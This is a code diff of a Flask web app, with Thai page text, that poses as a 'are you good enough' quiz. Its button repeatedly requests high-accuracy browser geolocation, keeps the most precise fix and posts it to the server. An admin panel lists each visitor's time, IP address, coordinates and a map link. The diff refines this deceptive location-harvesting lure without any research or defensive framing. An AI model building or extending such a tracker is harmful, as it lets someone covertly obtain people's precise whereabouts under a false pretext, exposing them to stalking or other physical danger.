@@ -12,7 +12,7 @@ def home():
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Location Check</title>
+<title>Location System</title>
 
 <style>
 body {
@@ -21,13 +21,13 @@ body {
     background: linear-gradient(180deg,#0f0f1f,#000);
     color:white;
     text-align:center;
-    padding-top:100px;
+    padding-top:80px;
 }
 .box {
     background: rgba(0,0,0,0.6);
     padding:40px;
     border-radius:20px;
-    width:350px;
+    width:360px;
     margin:auto;
     box-shadow:0 0 25px #6c5ce7;
 }
@@ -42,68 +42,81 @@ button {
 }
 button:hover {background:#a29bfe;}
 </style>
-
 </head>
+
 <body>
 
 <div class="box">
-<h2>📍 ใครคิดว่าตัวเองเป็นคนดี หรือแย่</h2>
-<p>ท่าคุณคิดว่าคุณยังดีไม่พอก็กดซะ</p>
-<button onclick="start()">เริ่ม</button>
+<h2>📍 ท่าคิดว่าตัวดีพอหรือไม่ดีพอ</h2>
+<p>ลองกดดู</p>
+<button onclick="start()">เริ่มตรวจสอบ</button>
 <p id="status"></p>
 </div>
 
 <script>
-let best = null;
-let count = 0;
+let results = [];
+let tries = 0;
+let MAX = 10;
 
 function start(){
-    document.getElementById("status").innerText = "กำลังค้นหา...";
+    document.getElementById("status").innerText = "กำลังค้นหาตำแหน่ง...";
     
-    if(navigator.geolocation){
-        for(let i=0;i<5;i++){
-            navigator.geolocation.getCurrentPosition(success, error, {
-                enableHighAccuracy:true,
-                timeout:10000,
-                maximumAge:0
-            });
-        }
+    for(let i=0;i<MAX;i++){
+        navigator.geolocation.getCurrentPosition(success, error, {
+            enableHighAccuracy:true,
+            timeout:8000,
+            maximumAge:0
+        });
     }
 }
 
 function success(pos){
-    count++;
+    tries++;
+
     let acc = pos.coords.accuracy;
 
-    if(!best || acc < best.acc){
-        best = {
-            lat: pos.coords.latitude,
-            lon: pos.coords.longitude,
-            acc: acc
-        };
+    let data = {
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude,
+        acc: acc
+    };
+
+    if(acc < 200){
+        results.push(data);
     }
 
     document.getElementById("status").innerText =
-        "กำลังวิเคราะห์... ("+count+"/5) | Accuracy: "+Math.round(acc)+"m";
+        "กำลังวิเคราะห์ ("+tries+"/"+MAX+") | "+Math.round(acc)+"m";
 
-    if(count >= 5){
-        send(best);
+    if(tries >= MAX){
+        finalize();
     }
+}
+
+function finalize(){
+    if(results.length === 0){
+        document.getElementById("status").innerText = "ตำแหน่งไม่แม่นพอ";
+        return;
+    }
+
+    results.sort((a,b)=>a.acc - b.acc);
+    let best = results[0];
+
+    document.getElementById("status").innerText =
+        "สำเร็จ ("+Math.round(best.acc)+"m)";
+
+    fetch("/location", {
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify(best)
+    }).then(()=>{
+        window.location="/done";
+    });
 }
 
 function error(){
     document.getElementById("status").innerText =
-        "กรุณาเปิด Location เพื่อความแม่นยำ";
-}
-
-function send(data){
-    fetch("/location", {
-        method:"POST",
-        headers:{"Content-Type":"application/json"},
-        body:JSON.stringify(data)
-    }).then(()=>{
-        window.location="/done";
-    });
+        "กรุณาเปิด Location และ WiFi";
 }
 </script>
 
@@ -124,7 +137,11 @@ def location():
 
 @app.route("/done")
 def done():
-    return "<h1 style='color:white;background:black;text-align:center;padding:100px'>📍 เสร็จแล้ว</h1>"
+    return """
+    <body style="background:black;color:white;text-align:center;padding:100px">
+    <h1>📍 ได้ตำแหน่งแล้ว</h1>
+    </body>
+    """
 
 @app.route("/admin")
 def admin():
@@ -143,7 +160,7 @@ def admin():
 
     return f"""
     <body style="background:#111;color:white">
-    <h1>📊 ADMIN</h1>
+    <h1>📊 ADMIN PANEL</h1>
     <table border=1 width=100%>
     <tr><th>Time</th><th>IP</th><th>Location</th><th>Accuracy</th><th>Map</th></tr>
     {rows}
